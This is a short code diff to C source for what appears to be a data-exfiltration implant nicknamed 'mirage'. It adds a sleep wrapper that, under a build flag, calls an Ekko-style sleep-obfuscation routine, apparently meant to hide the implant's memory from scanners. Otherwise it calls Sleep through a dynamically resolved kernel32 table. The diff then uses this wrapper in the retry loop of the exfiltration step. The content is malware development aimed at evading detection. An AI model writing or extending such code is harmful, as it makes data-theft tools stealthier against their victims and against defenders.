@@ -15,6 +15,13 @@
 #include "messengers.h"
 #include "lz4.h"
 
+#ifdef ENABLE_SLEEP_OBFUSCATION
+#include "sleep_obfusc.h"
+static void mirage_sleep(DWORD ms) { ekko_sleep(ms); }
+#else
+static void mirage_sleep(DWORD ms) { if (main_k32_ensure_api()) g_main_k32.pSlp(ms); }
+#endif
+
 #ifdef ENABLE_SYSTEM_INFO
 extern int mirage_collect_system_info(char *output, size_t outlen);
 #endif
@@ -688,7 +695,7 @@ int main(int argc, char *argv[]) {
                                    archive, archive_len, metadata) == 0) {
                         exfil_ok = 1;
                     } else if (attempt < 2) {
-                        g_main_k32.pSlp(2000);
+                        mirage_sleep(2000);
                     }
                 }
             }
